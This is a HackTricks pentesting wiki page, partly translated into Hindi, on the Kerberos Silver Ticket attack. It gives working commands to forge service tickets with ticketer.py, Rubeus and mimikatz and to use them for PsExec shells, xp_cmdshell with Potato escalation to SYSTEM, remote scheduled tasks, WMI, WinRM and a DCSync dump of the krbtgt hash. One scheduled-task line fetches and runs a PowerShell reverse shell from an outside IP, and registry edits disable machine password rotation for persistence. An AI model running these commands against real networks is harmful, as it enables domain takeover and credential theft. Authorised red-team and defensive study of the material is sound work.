# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

The **Silver Ticket** attack involves the exploitation of service tickets in Active Directory (AD) environments. This method relies on **acquiring the NTLM hash of a service account**, such as a computer account, to forge a Ticket Granting Service (TGS) ticket. With this forged ticket, an attacker can access specific services on the network, **impersonating any user**, typically aiming for administrative privileges. It's emphasized that using AES keys for forging tickets is more secure and less detectable.

> [!WARNING]
> Silver Tickets are less detectable than Golden Tickets because they only require the **hash of the service account**, not the krbtgt account. However, they are limited to the specific service they target. Moreover, just stealing the password of a user.
Moreover, if you compromise an **account's password with a SPN** you can use that password to create a Silver Ticket impersonating any user to that service.

For ticket crafting, different tools are employed based on the operating system:

### On Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Windows पर
```bash
# Using Rubeus
## /ldap option is used to get domain data automatically
## With /ptt we already load the tickt in memory
rubeus.exe asktgs /user:<USER> [/rc4:<HASH> /aes128:<HASH> /aes256:<HASH>] /domain:<DOMAIN> /ldap /service:cifs/domain.local /ptt /nowrap /printcmd

# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
CIFS service को पीड़ित के फ़ाइल सिस्टम तक पहुँचने के सामान्य लक्ष्य के रूप में हाइलाइट किया गया है, लेकिन HOST और RPCSS जैसी अन्य services को भी टास्क और WMI queries के लिए एक्स्प्लोइट किया जा सकता है।

### उदाहरण: MSSQL service (MSSQLSvc) + Potato to SYSTEM

यदि आपके पास किसी SQL service account (उदा., sqlsvc) का NTLM hash (या AES key) है, तो आप MSSQL SPN के लिए एक TGS फोर्ज कर सकते हैं और SQL service के लिए किसी भी उपयोगकर्ता का impersonate कर सकते हैं। वहाँ से, xp_cmdshell को सक्षम करके SQL service अकाउंट के रूप में कमांड निष्पादित करें। यदि उस token में SeImpersonatePrivilege है, तो Potato को chain करके SYSTEM तक elevate कर लें।
```bash
# Forge a silver ticket for MSSQLSvc (RC4/NTLM example)
python ticketer.py -nthash <SQLSVC_RC4> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- यदि परिणामी context में SeImpersonatePrivilege मौजूद है (अक्सर service accounts के लिए सत्य), SYSTEM प्राप्त करने के लिए Potato variant का उपयोग करें:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
MSSQL का दुरुपयोग करने और xp_cmdshell को सक्षम करने के बारे में अधिक विवरण:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Potato techniques का अवलोकन:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## उपलब्ध सेवाएँ

| सेवा प्रकार                                | Service Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Depending on OS also:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In some occasions you can just ask for: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, also psexec            | CIFS                                                                       |
| LDAP operations, included DCSync           | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Rubeus का उपयोग करके आप इन सभी tickets के लिए निम्न parameter का उपयोग कर अनुरोध कर सकते हैं:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets के Event IDs

- 4624: खाता लॉगऑन
- 4634: खाता लॉगऑफ
- 4672: प्रशासक लॉगऑन

## स्थायी पहुँच

मशीनों के पासवर्ड को हर 30 दिनों में बदलने से रोकने के लिए `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` सेट करें या आप `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` को 30 दिनों से बड़ी वैल्यू पर सेट कर सकते हैं ताकि यह बताना आसान हो कि मशीन का पासवर्ड कब रोटेट होना चाहिए।

## Service tickets का दुरुपयोग

निम्न उदाहरणों में मान लें कि टिकट प्रशासक खाते की नकल करके प्राप्त किया गया है।

### CIFS

इस टिकट के साथ आप `C$` और `ADMIN$` फ़ोल्डर को **SMB** के माध्यम से एक्सेस कर पाएँगे (यदि वे एक्सपोज़्ड हैं) और रिमोट फाइलसिस्टम के किसी हिस्से में फाइलें कॉपी कर सकेंगे, कुछ ऐसा करते हुए:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
आप होस्ट के अंदर शेल प्राप्त कर पाएंगे या **psexec** का उपयोग करके मनमाने कमांड निष्पादित कर पाएंगे:

{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### होस्ट

इस अनुमति के साथ आप रिमोट कंप्यूटरों में शेड्यूल किए गए टास्क बना सकते हैं और मनमाने कमांड निष्पादित कर सकते हैं:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

इन टिकटों के साथ आप **लक्षित सिस्टम में WMI निष्पादित कर सकते हैं**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
निम्न पृष्ठ पर **wmiexec के बारे में अधिक जानकारी** देखें:

{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### होस्ट + WSMAN (WINRM)

किसी कंप्यूटर पर winrm एक्सेस होने पर आप **इसे एक्सेस** कर सकते हैं और यहाँ तक कि PowerShell भी प्राप्त कर सकते हैं:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Check the following page to learn **more ways to connect with a remote host using winrm**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> ध्यान दें कि **winrm रिमोट कंप्यूटर पर सक्रिय और सुनने की स्थिति में होना चाहिए** ताकि उस तक पहुँच की जा सके।

### LDAP

इस विशेषाधिकार के साथ आप **DCSync** का उपयोग करके DC डेटाबेस को dump कर सकते हैं:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**DCSync के बारे में अधिक जानें** निम्नलिखित पृष्ठ पर:


{{#ref}}
dcsync.md
{{#endref}}


## संदर्भ

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)



{{#include ../../banners/hacktricks-training.md}}
